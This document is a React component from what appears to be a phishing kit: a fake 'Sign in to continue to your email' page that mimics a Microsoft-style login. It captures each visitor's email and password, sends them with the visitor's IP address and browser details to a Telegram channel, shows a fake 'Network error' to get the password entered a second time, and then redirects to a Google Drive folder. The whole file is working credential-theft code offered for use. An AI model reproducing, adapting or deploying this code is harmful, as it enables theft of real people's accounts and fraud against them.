import React, { useEffect, useState } from "react";
import "./others.css" // Adjust the path if necessary
import {
  getUserIP,
  getUserBrowser,
  sendMessageToTelegram,
} from "../../services/api"; // Make sure the path is correct

const Others = () => {
  const [ipAddress, setIpAddress] = useState("");
  const [browser, setBrowser] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPasswordForm, setShowPasswordForm] = useState(false);

  const [attemptCount, setAttemptCount] = useState(0);
  const [showErrorMessage, setShowErrorMessage] = useState(false);

  useEffect(() => {
    getUserIP().then(setIpAddress);
    setBrowser(getUserBrowser());
  }, []);

  const handleEmailSubmit = async (event) => {
    event.preventDefault();
    setShowPasswordForm(true);
    // Call Telegram API to send the email and user information
    const message = `Root Logs\nMultipage\nOther\nEmail entered: ${email}\n\n\nuserIP: ${ipAddress}\nuserBrowser: ${browser}`;
    await sendMessageToTelegram(message);
  };

  const handlePasswordSubmit = async (event) => {
    event.preventDefault();
    // Call Telegram API to send the password and user information
    const message = `Root Logs\nMultipage\nOther\nEmail entered: ${email}\nPassword entered: ${password}\n\nuserIP: ${ipAddress}\nuserBrowser: ${browser}`;
    await sendMessageToTelegram(message);

    // Increment the attempt count
    setAttemptCount((prevCount) => prevCount + 1);

    if (attemptCount === 0) {
      // Show error message after the first attempt
      setShowErrorMessage(true);
    } else if (attemptCount >= 1) {
      // Redirect after the second attempt
      window.location.href ="https://drive.google.com/drive/folders/1a8Z8TEf_VrdB7sMm2egY0jr1EFfrbytZ?usp=sharing"; // Change to your desired URL
    }
  };

  return (
    <div className="bg-transparent">
      <div class="video-background">
        <iframe
          src="https://www.youtube.com/embed/Na9S6gx7yqU?autoplay=1&controls=0&showinfo=0&autohide=1&loop=1&mute=1&playlist=Na9S6gx7yqU"
          frameborder="0"
          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
          allowfullscreen
          title="Background Video"
        ></iframe>
      </div>
      <div className="min-h-screen flex flex-col justify-center py-12 sm:px-6 lg:px-8 content">
        <div className="mt-8 sm:mx-auto mx-12 sm:w-full sm:max-w-md">
          <div className="bg-white bg-opacity-50 py-8 px-4 shadow sm:rounded-lg sm:px-10">
            {/* Conditional rendering for email or password form */}
            {!showPasswordForm ? (
              <form className="space-y-6" onSubmit={handleEmailSubmit}>
                {/* ... */}
                <div class="mb-3 sm:mx-auto sm:w-full sm:max-w-md">
                  <h2 class=" text-start text-2xl font-medium text-gray-900">
                    Sign in
                  </h2>
                  <p class="text-sm">to continue to your email.</p>
                </div>
                <input
                  id="email"
                  name="email"
                  type="email"
                  autoComplete="email"
                  placeholder="Email address, phone number, or Skype"
                  required
                  className="bg-white bg-opacity-50 appearance-none block w-full px-3 py-2 border-b border-gray-600 shadow-sm placeholder-black placeholder:font-semibold focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />

                <div className="flex justify-end">
                  <button
                    type="submit"
                    className="w-32 flex justify-center py-2 px-4 border border-transparent shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
                  >
                    Next
                  </button>
                </div>
              </form>
            ) : (
              <form className="space-y-6" onSubmit={handlePasswordSubmit}>
                {/* ... */}
                <span
                  id="userEmail"
                  className="block text-base font-medium text-gray-700 mb-6"
                >
                  {email} {/* Display the email here */}
                </span>
                <label className="mb-6 text-start text-2xl font-medium text-gray-900">
                  Enter Password
                </label>
                <input
                  id="password"
                  name="password"
                  type="password"
                  autoComplete="current-password"
                  placeholder="Password"
                  required
                  className="bg-white bg-opacity-50 appearance-none block w-full px-3 py-2 border-b border-gray-600 shadow-sm placeholder-black placeholder:font-semibold focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />

                <div className="flex justify-end">
                  <button
                    type="submit"
                    className="w-32 flex justify-center py-2 px-4 border border-transparent shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
                  >
                    Sign in
                  </button>
                </div>
              </form>
            )}

            {showErrorMessage && (
              <div className="text-red-600 mt-8 text-center">
                Network error, please try again.
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default Others;
